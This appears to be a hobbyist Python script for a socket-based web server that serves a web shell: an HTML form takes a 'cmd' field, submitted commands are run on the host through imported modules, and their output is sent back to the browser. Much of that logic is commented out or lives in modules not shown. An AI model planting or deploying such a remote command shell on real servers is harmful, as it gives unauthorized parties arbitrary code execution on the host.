# first of all import the socket library
import socket
import os
import urllib
import cgi
import subprocess
import cgi, cgitb
import sys, os, io
from subprocess import call
import subprocess
import webshell01
import utility
from constant import *
import traitant
import env

cgitb.enable()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Socket successfully created")
port = 12345
sock.bind(('127.0.0.1', port))
print("socket binded to %s" % (port))
sock.listen(5)
print("socket is listening")

while True:
    cmdres = ""
    c, addr = sock.accept()

    print('Got connection from', addr)
    data = ""
    recvstr = c.recvfrom(4096)[0].decode("utf-8")
    # session_id = ""
    # if recvstr.find("POST") == 0:
    #     data, session_id = traitant.retrieve_form_data(recvstr)
    #     print("session id:", session_id)
    #     cmdres = env.histories[session_id]
    #     print("CMD RES LEN 1 :", len(cmdres))
    #
    # elif recvstr.find("GET") == 0:
    #     session_id = utility.generate_session_code(SESSION_ID_LENGTH)
    #     if session_id not in env.histories.keys():
    #         env.histories[session_id] = ""
    # print(data)
    #
    # try:
    #     d = traitant.run2(data)
    #     print(d)
    #     cmdres += d.replace("\n", "<br>")
    # except Exception as ex:
    #     print(ex.args)
    #
    # sss = """HTTP/1.0 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n
    # <body>
    # <br />
    # """
    # sss += "\r\n" + cmdres
    # sss += """
    # <br />
    # <form action='' method="post">
    # <input type="text" name="cmd" class="cmdinput" value='' />
    # <input type="hidden" name="session" value='"""
    # sss += session_id
    # sss += """' />
    # <input type="submit" class="cmdbutton" value="Exec" />
    # </form>
    # </body>
    # """
    c.send(bytes(webshell01.render(recvstr), 'utf-8'))
    print("CMD RES LEN 2 :", len(cmdres))
    # env.histories[session_id] = cmdres
    # print(c.recv(4096).decode('utf-8'))

    # call(["python", "shell1.py"])
    # print(os.environ.get("QUERY_STRING", "No Query String in url"))
    # print(os.environ)
    # form = cgi.FieldStorage()
    # print(form)
    # Get data from fields
    # cmd1 = form.getvalue('cmd')
    # print(cmd1)
    c.close()
